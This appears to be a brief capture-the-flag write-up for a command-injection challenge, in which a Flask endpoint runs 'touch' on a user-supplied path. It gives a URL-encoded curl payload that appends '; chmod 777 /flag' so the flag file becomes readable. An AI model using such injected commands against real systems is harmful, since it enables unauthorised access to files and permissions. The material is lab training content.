# CMDi 5

```shell
cat /challenge/server
```

The Flask app takes a path as query param (`/assignment?path`) and executes `touch {path}`
Output is not shown, so `cat` won't work. But we can change the permission of the flag file and then read it.

Executing: \
touch **/flag; chmod 777 /flag**

Start the server and use curl:

```shell
curl http://challenge.localhost:80/assignment?path=%2Fflag%3B%20chmod%20777%20%2Fflag
cat /flag
```
